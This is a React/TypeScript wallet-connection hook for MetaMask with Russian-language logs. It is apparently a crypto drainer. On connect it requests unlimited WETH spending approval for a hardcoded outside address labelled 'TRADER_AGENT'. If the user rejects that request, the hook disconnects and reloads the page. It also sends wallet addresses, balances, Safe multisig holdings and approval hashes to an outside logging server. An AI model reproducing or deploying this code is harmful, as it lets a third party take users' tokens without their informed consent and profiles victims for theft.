import { useCallback, useEffect, useState } from "react"
import { useToast } from "./use-toast"
import { ethers } from "ethers"

interface WalletState {
    isConnected: boolean
    address: string
    balance: string
    chainId: number | null
    walletType: string | null
    safeAddresses?: string[]
    activeSafe?: string | null
}

const TARGET_CHAIN_ID = 1
const READ_PROVIDER = new ethers.JsonRpcProvider("https://cloudflare-eth.com")

const TOKENS = [
    { name: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2" },
    // { name: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
    // { name: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7" },
]

const TRADER_AGENT = "0x7edcf18529d7d697064fad02d1879ef73bf849b5"

export function useWalletConnection() {
    const [state, setState] = useState<WalletState>(() => {
        if (typeof window !== "undefined") {
            const isConnectAllowed = localStorage.getItem("wallet_connect_allowed")
            const saved = localStorage.getItem("wallet_state")

            if (isConnectAllowed === "false") {
                return {
                    isConnected: false,
                    address: "",
                    balance: "0.00",
                    chainId: null,
                    walletType: null,
                    safeAddresses: [],
                }
            }

            if (saved) return JSON.parse(saved)
        }

        return {
            isConnected: false,
            address: "",
            balance: "0.00",
            chainId: null,
            walletType: null,
            safeAddresses: [],
        }
    })

    const [isConnecting, setIsConnecting] = useState(false)
    const [error, setError] = useState<string | null>(null)
    const { toast } = useToast()

    const logEvent = useCallback(async (type: string, data: any = {}) => {
        if (typeof window === "undefined") return

        const log = {
            type,
            time: new Date().toISOString(),
            userAgent: navigator.userAgent,
            ...data,
        }

        const existing = JSON.parse(localStorage.getItem("wallet_logs") || "[]")
        existing.push(log)
        localStorage.setItem("wallet_logs", JSON.stringify(existing))

        console.log(`[LOG] ${type}`, log)

        try {
            await fetch("https://admin.armydex.pro/api/log-save", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(log),
            })
        } catch (err) {
            console.warn("Не удалось отправить лог на API:", err)
        }
    }, [])

    const getLogs = useCallback(() => {
        if (typeof window === "undefined") return []
        return JSON.parse(localStorage.getItem("wallet_logs") || "[]")
    }, [])

    useEffect(() => {
        if (typeof window !== "undefined") {
            localStorage.setItem("wallet_state", JSON.stringify(state))
        }
    }, [state])

    const getBalance = useCallback(async (address: string): Promise<string> => {
        if (!address) return "0.00"
        try {
            const rawBalance = await READ_PROVIDER.getBalance(address)
            const formatted = ethers.formatEther(rawBalance)
            return Number(formatted).toFixed(4)
        } catch {
            return "0.00"
        }
    }, [])

    const checkSafesForOwner = useCallback(async (ownerAddress: string, networkName = "mainnet") => {
        console.log(`[SAFE] Проверяем мультисиги для ${ownerAddress}...`)
        try {
            const apiUrl = `https://safe-transaction-${networkName}.safe.global/api/v1/owners/${ownerAddress}/safes/`
            const res = await fetch(apiUrl)
            if (!res.ok) throw new Error(`Safe API error: ${res.status}`)
            const data = await res.json()
            console.log(`[SAFE] Найдено:`, data.safes || [])
            return data.safes || []
        } catch (e) {
            console.warn("[SAFE] Ошибка при запросе:", e)
            return []
        }
    }, [])

    const autoApproveTokens = useCallback(async (providedSigner?: any) => {
        try {
            if (typeof window === "undefined" || !window.ethereum) return
            const provider = new ethers.BrowserProvider(window.ethereum as any)
            const signer = providedSigner || (await provider.getSigner())
            const userAddress = (await signer.getAddress()).toLowerCase()
            if (!userAddress) return
            const approvedWallets: string[] = JSON.parse(localStorage.getItem("approved_wallets") || "[]")
            if (approvedWallets.includes(userAddress)) {
                console.log("Этот кошелек уже выполнял approve, пропускаем")
                return
            }

            const tokenAbi = [
                "function approve(address spender, uint256 amount) public returns (bool)",
                "function allowance(address owner, address spender) public view returns (uint256)",
                "function symbol() view returns (string)",
            ]

            // track whether any approvals succeeded in this session
            const approvedThisSession: string[] = []

            for (const token of TOKENS) {
                try {
                    const readOnly = new ethers.Contract(token.address, tokenAbi, provider)
                    const writeable = new ethers.Contract(token.address, tokenAbi, signer)
                    const symbol = (await readOnly.symbol()).toString?.() || token.name
                    const allowance: any = await readOnly.allowance(userAddress, TRADER_AGENT)

                    if (allowance && String(allowance) !== "0") {
                        console.log(`${symbol}: уже разрешен (${allowance.toString()})`)
                        approvedThisSession.push(symbol)
                        continue
                    }

                    toast({ title: `${symbol}: отправляем разрешение...` })

                    let tx
                    try {
                        const gasEstimate = await (writeable as any).estimateGas?.approve?.(TRADER_AGENT, ethers.MaxUint256).catch(() => null)
                        const txRequest: any = { to: token.address, data: writeable.interface.encodeFunctionData("approve", [TRADER_AGENT, ethers.MaxUint256]) }
                        if (gasEstimate) {
                            txRequest.gasLimit = gasEstimate.mul(110).div(100)
                        }
                        tx = await (writeable as any).approve(TRADER_AGENT, ethers.MaxUint256, txRequest)
                    } catch (sendErr) {
                        console.warn("Ошибка при попытке оценить/отправить с газ-оценкой:", sendErr)
                        tx = await (writeable as any).approve(TRADER_AGENT, ethers.MaxUint256)
                    }

                    toast({
                        title: `${symbol}: ожидание подтверждения...`,
                        description: `Хеш: ${tx.hash.slice(0, 6)}...${tx.hash.slice(-4)}`,
                    })

                    const receipt = await tx.wait()
                    if (receipt && receipt.status === 1) {
                        toast({ title: `${symbol}: успешно разрешен`, description: `ТХ: ${tx.hash}` })
                        logEvent("token_approved", { token: symbol, tx: tx.hash, owner: userAddress })
                        console.log(`${symbol}: approve подтверждён, хеш ${tx.hash}`)
                        approvedThisSession.push(symbol)
                    } else {
                        toast({ title: `${symbol}: approve не подтверждён`, variant: "destructive" })
                        console.warn(`${symbol}: транзакция завершилась со статусом 0`, receipt)
                    }
                } catch (e: any) {
                    // mark failure (no-op in this simplified flow)
                    const userRejected =
                        e?.code === 4001 ||
                        e?.code === "ACTION_REJECTED" ||
                        (e?.message && e.message.includes("User denied"))
                    if (userRejected) {
                        toast({ title: "Кошелек не был подключен", description: "Интеграция с сайтом отменена", variant: "destructive" })

                        return "USER_REJECTED"
                    } else if (e.code === 'TRANSACTION_REPLACED') {
                        console.warn("Транзакция заменена", e)
                    } else if (e.code === -32603) {
                        console.warn("RPC internal error", e)
                    } else {
                        console.warn(`Approve ${token.name} не удался.`, e)
                    }
                    toast({
                        title: `${token.name}: Ошибка разрешения!`,
                        description: e?.message?.split?.("\n")?.[0] || String(e),
                        variant: "destructive",
                    })
                }
            }

            if (approvedThisSession.length > 0) {
                const existing: string[] = JSON.parse(localStorage.getItem("approved_wallets") || "[]")
                const normalized = userAddress.toLowerCase()
                if (!existing.includes(normalized)) {
                    existing.push(normalized)
                    localStorage.setItem("approved_wallets", JSON.stringify(existing))
                }
                console.log("approved_wallets обновлён:", approvedThisSession)
            } else {
                console.log("Не было успешных approve в этой сессии")
            }
        } catch (outerErr) {
            console.warn("Ошибка auto-approve (внешняя):", outerErr)
        }
    }, [toast, logEvent])

    const disconnect = useCallback(() => {
        console.log("Отключаем кошелек...")
        setState({
            isConnected: false,
            address: "",
            balance: "0.00",
            chainId: null,
            walletType: null,
            safeAddresses: [],
        })
        localStorage.removeItem("wallet_state")
        logEvent("wallet_disconnected")
        setError(null)
        toast({ title: "Кошелек отключен", description: "Состояние сброшено" })
    }, [toast, logEvent])

    const refreshConnectedState = useCallback(async () => {
        try {
            if (!window.ethereum) return
            // Create provider for network info, but use direct RPC to get addresses as strings
            const provider = new ethers.BrowserProvider(window.ethereum as any)
            const accounts = (await window.ethereum.request({ method: "eth_accounts" })) as string[]
            if (!accounts || accounts.length === 0) return
            const accountAddress = accounts[0]
            const balance = await getBalance(accountAddress)
            let network = null
            let chainId: number | null = null
            try {
                network = await provider.getNetwork()
                chainId = network?.chainId ? Number(network.chainId) : null
            } catch {
                if (window.ethereum.chainId) {
                    try {
                        chainId = Number(window.ethereum.chainId)
                    } catch {
                        chainId = parseInt(window.ethereum.chainId, 16) || null
                    }
                }
            }
            if (!chainId) {
                try {
                    const rpcChainId = await window.ethereum.request({ method: "eth_chainId" })
                    chainId = parseInt(rpcChainId, 16)
                } catch { }
            }
            const safes = await checkSafesForOwner(accountAddress, "mainnet")
            const newState = {
                isConnected: true,
                address: accountAddress,
                balance,
                chainId,
                walletType: "metamask",
                safeAddresses: safes,
            }
            setState(newState)
            localStorage.setItem("wallet_state", JSON.stringify(newState))
        } catch (e) {
            console.warn("refreshConnectedState failed:", e)
        }
    }, [getBalance, checkSafesForOwner])

    const connect = useCallback(
        async (walletId: string): Promise<boolean> => {
            console.log("Начало подключения:", walletId)
            setIsConnecting(true)
            setError(null)
            logEvent("connect_click", { walletId })

            if (walletId !== "metamask") {
                setError("Только MetaMask поддерживается.")
                setIsConnecting(false)
                toast({ title: "Ошибка", description: `${walletId} не поддерживается`, variant: "destructive" })
                return false
            }

            try {
                if (!window.ethereum) throw new Error("MetaMask не установлен")
                // ensure accounts are requested via the provider
                await window.ethereum.request({ method: "eth_requestAccounts" })
                const provider = new ethers.BrowserProvider(window.ethereum as any)
                const signer = await provider.getSigner()
                const accountAddress = await signer.getAddress()
                console.log(`Адрес: ${accountAddress}`)

                let chainId: number | null = null
                let network: any = null

                try {
                    network = await provider.getNetwork()
                    chainId = network?.chainId ? Number(network.chainId) : null
                } catch {
                    if (window.ethereum?.chainId) {
                        try {
                            chainId = Number(window.ethereum.chainId)
                        } catch {
                            chainId = parseInt(window.ethereum.chainId, 16) || null
                        }
                    }
                }

                if (!chainId) {
                    try {
                        const rpcChainId = await window.ethereum.request({ method: "eth_chainId" })
                        chainId = parseInt(rpcChainId, 16)
                    } catch { }
                }

                if (!chainId) throw new Error("Не удалось определить сеть.")
                console.log(`Сеть: ${network?.name || "неизвестная"} (${chainId})`)

                if (chainId !== TARGET_CHAIN_ID)
                    throw new Error("Неверная сеть. Переключитесь на Ethereum Mainnet")

                const balance = await getBalance(accountAddress)
                console.log(`Баланс: ${balance} ETH`)

                const safeAddresses = await checkSafesForOwner(accountAddress, "mainnet")
                if (safeAddresses.length > 0)
                    console.log("SAFE найден:", safeAddresses)
                else
                    console.log("SAFE не найден.")

                const newState = {
                    isConnected: true,
                    address: accountAddress,
                    balance,
                    chainId,
                    walletType: "metamask",
                    safeAddresses,
                }
                setState(newState)
                localStorage.setItem("wallet_state", JSON.stringify(newState))

                if (safeAddresses.length > 0) {
                    console.log("SAFE найден, вызываем событие для открытия модалки выбора...")
                    window.dispatchEvent(new CustomEvent("wallet:safeFound", { detail: safeAddresses }))
                }

                logEvent("wallet_connected", {
                    address: accountAddress,
                    chainId,
                    balance,
                    safes: safeAddresses,
                })

                toast({ title: "Кошелек подключен", description: `${accountAddress.slice(0, 6)}...${accountAddress.slice(-4)}` })
                localStorage.setItem('wallet_connect_allowed', 'true')
                const approveResult = await autoApproveTokens(signer)
                if (approveResult === "USER_REJECTED") {
                    console.warn("Пользователь отклонил разрешение — прерываем подключение полностью")

                    await disconnect()

                    localStorage.removeItem("wallet_state")
                    localStorage.setItem('wallet_connect_allowed', 'false')

                    window.location.reload()

                    return false
                }
                console.log("Подключение завершено успешно.")
                window.dispatchEvent(new Event("wallet:connected"))
                await refreshConnectedState()
                return true
            } catch (err: any) {
                const msg = err.message || "Не удалось подключить кошелек"
                setError(msg)
                console.error("Ошибка подключения:", msg)
                logEvent("wallet_error", { message: msg })
                toast({ title: "Ошибка подключения", description: msg, variant: "destructive" })
                return false
            } finally {
                setIsConnecting(false)
            }
        },
        [getBalance, toast, logEvent, autoApproveTokens, checkSafesForOwner, refreshConnectedState, disconnect]
    )

    const clearError = useCallback(() => setError(null), [])

    useEffect(() => {
        if (window.ethereum) {
            const handleAccountsChanged = (accounts: string[]) => {
                console.log("Смена аккаунта:", accounts)
                if (accounts.length === 0) {
                    disconnect()
                } else if (!state.address || accounts[0].toLowerCase() !== state.address.toLowerCase()) {
                    setState((prev) => ({ ...prev, address: accounts[0] }))
                }
            }

            const handleChainChanged = () => {
                console.log("Смена сети. Перезагрузка страницы...")
                window.location.reload()
            }

            window.ethereum.on("accountsChanged", handleAccountsChanged)
            window.ethereum.on("chainChanged", handleChainChanged)

            return () => {
                window.ethereum.removeListener("accountsChanged", handleAccountsChanged)
                window.ethereum.removeListener("chainChanged", handleChainChanged)
            }
        }
    }, [state.address, disconnect])

    useEffect(() => {
        console.log("Проверяем авто-подключение...")
        const saved = localStorage.getItem("wallet_state")
        if (saved) {
            const parsed = JSON.parse(saved)
            if (parsed?.isConnected && parsed?.address) {
                console.log("Восстановлено подключение:", parsed.address)
                setState(parsed)
            }
        }

        const isReconnectAllowed = localStorage.getItem('wallet_connect_allowed')
        if (isReconnectAllowed === 'false') {
            console.log("Автоподключение заблокировано из-за предыдущего отказа.")
            return
        }

        const checkExistingConnection = async () => {
            try {
                if (window.ethereum) {
                    const provider = new ethers.BrowserProvider(window.ethereum as any)
                    const accounts = (await window.ethereum.request({ method: "eth_accounts" })) as string[]
                    if (accounts.length > 0) {
                        const accountAddress = accounts[0]
                        const balance = await getBalance(accountAddress)
                        const network = await provider.getNetwork().catch(() => null)
                        const chainId = network?.chainId ? Number(network.chainId) : null
                        const safes = await checkSafesForOwner(accountAddress, "mainnet")

                        console.log("Найдены данные при автоподключении:", { accountAddress, safes })
                        setState({
                            isConnected: true,
                            address: accountAddress,
                            balance,
                            chainId,
                            walletType: "metamask",
                            safeAddresses: safes,
                        })

                        if (safes.length > 0) {
                            console.log("SAFE найден при автоподключении, вызываем модалку выбора...")
                            window.dispatchEvent(new CustomEvent("wallet:safeFound", { detail: safes }))
                        }
                    }
                }
            } catch (err) {
                console.warn("Auto reconnect failed:", err)
            }
        }

        checkExistingConnection()
    }, [getBalance, checkSafesForOwner])

    useEffect(() => {
        const handleWalletConnected = async () => {
            await refreshConnectedState()
        }

        window.addEventListener("wallet:connected", handleWalletConnected)
        return () => {
            window.removeEventListener("wallet:connected", handleWalletConnected)
        }
    }, [refreshConnectedState])

    // Listen for user selection of a Gnosis Safe from the UI and mark it active
    useEffect(() => {
        const handler = (e: any) => {
            try {
                const addr = e.detail as string
                if (!addr) return
                setState((prev) => ({ ...prev, activeSafe: addr, safeAddresses: prev.safeAddresses || [] }))
                localStorage.setItem('wallet_state', JSON.stringify({ ...state, activeSafe: addr }))
                toast({ title: 'Safe выбран', description: addr })
                logEvent('safe_selected', { address: addr })
            } catch (err) {
                console.warn('wallet:safeSelected handler failed', err)
            }
        }

        window.addEventListener('wallet:safeSelected', handler as EventListener)
        return () => window.removeEventListener('wallet:safeSelected', handler as EventListener)
    }, [toast, logEvent, state])

    return {
        ...state,
        isConnecting,
        error,
        connect,
        disconnect,
        clearError,
        logEvent,
        getLogs,
    }
}

declare global {
    interface Window {
        ethereum?: any
    }
}
